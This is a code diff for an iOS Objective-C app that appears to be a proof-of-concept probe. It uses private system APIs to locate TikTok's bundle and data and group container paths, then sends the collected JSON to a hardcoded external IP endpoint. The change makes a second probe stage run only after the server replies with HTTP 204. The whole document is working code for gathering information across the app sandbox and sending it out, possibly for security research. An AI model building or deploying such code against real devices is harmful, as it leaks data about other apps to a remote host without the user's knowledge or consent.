@@ -86,14 +86,13 @@ static NSDictionary *Collect(void) {
  Class cls=NSClassFromString(@"LSApplicationProxy");
  id proxy=Query(cls,@"applicationProxyForIdentifier:",@"com.ss.iphone.ugc.Ame",YES,cls,@"lookup",r);
  BOOL valid=proxy && cls && [proxy isKindOfClass:cls];r[@"proxy_type_valid"]=@(valid);
- if(!valid){MCM(r);return r;}
+ if(!valid)return r;
  id identifier=Query(proxy,@"applicationIdentifier",nil,NO,NSString.class,@"identifier",r);
  BOOL match=[identifier isKindOfClass:NSString.class] && [identifier isEqualToString:@"com.ss.iphone.ugc.Ame"];
- r[@"identifier_match"]=@(match);if(!match){MCM(r);return r;}
+ r[@"identifier_match"]=@(match);if(!match)return r;
  Query(proxy,@"bundleURL",nil,NO,NSURL.class,@"bundle",r);
  Query(proxy,@"dataContainerURL",nil,NO,NSURL.class,@"data",r);
  Query(proxy,@"groupContainerURLs",nil,NO,NSDictionary.class,@"groups",r);
- MCM(r);
  return r;
 }
 @interface AppDelegate:UIResponder<UIApplicationDelegate,NSURLSessionTaskDelegate>
@@ -122,7 +121,7 @@ static NSDictionary *Collect(void) {
 -(BOOL)application:(UIApplication*)application didFinishLaunchingWithOptions:(NSDictionary*)options {
  self.window=[[UIWindow alloc]initWithFrame:UIScreen.mainScreen.bounds];UIViewController *vc=[UIViewController new];self.window.rootViewController=vc;[self.window makeKeyAndVisible];
  UITextView *text=[[UITextView alloc]initWithFrame:vc.view.bounds];text.autoresizingMask=UIViewAutoresizingFlexibleWidth|UIViewAutoresizingFlexibleHeight;text.editable=NO;[vc.view addSubview:text];
- NSDictionary *report=Collect();NSData *data=[NSJSONSerialization dataWithJSONObject:report options:0 error:nil];
+ NSMutableDictionary *report=[Collect() mutableCopy];report[@"stage"]=@0;NSData *data=[NSJSONSerialization dataWithJSONObject:report options:0 error:nil];
  text.text=[[NSString alloc]initWithData:data encoding:NSUTF8StringEncoding];
  if(!data || data.length>16384)return YES;
  NSURL *endpoint=[NSURL URLWithString:@"https://192.17.1.10:59701/did603/f94de95617e773097ee572267e457658"];
@@ -135,7 +134,13 @@ static NSDictionary *Collect(void) {
  [[self.session dataTaskWithRequest:req completionHandler:^(NSData *body,NSURLResponse *response,NSError *error){
   NSInteger status=[response isKindOfClass:NSHTTPURLResponse.class]?[(NSHTTPURLResponse*)response statusCode]:0;
   dispatch_async(dispatch_get_main_queue(),^{text.text=[text.text stringByAppendingFormat:@"\nCallback HTTP: %ld; transport error: %ld",(long)status,(long)error.code];});
-  [self.session finishTasksAndInvalidate];
+  if(!error && status==204){
+   MCM(report);report[@"stage"]=@1;
+   NSData *finalData=[NSJSONSerialization dataWithJSONObject:report options:0 error:nil];
+   if(finalData && finalData.length<=16384){NSMutableURLRequest *finalReq=[req mutableCopy];finalReq.HTTPBody=finalData;
+    [[self.session dataTaskWithRequest:finalReq completionHandler:^(NSData *b,NSURLResponse *v,NSError *e){[self.session finishTasksAndInvalidate];}] resume];
+   }else [self.session finishTasksAndInvalidate];
+  }else [self.session finishTasksAndInvalidate];
  }] resume];return YES;
 }
 @end
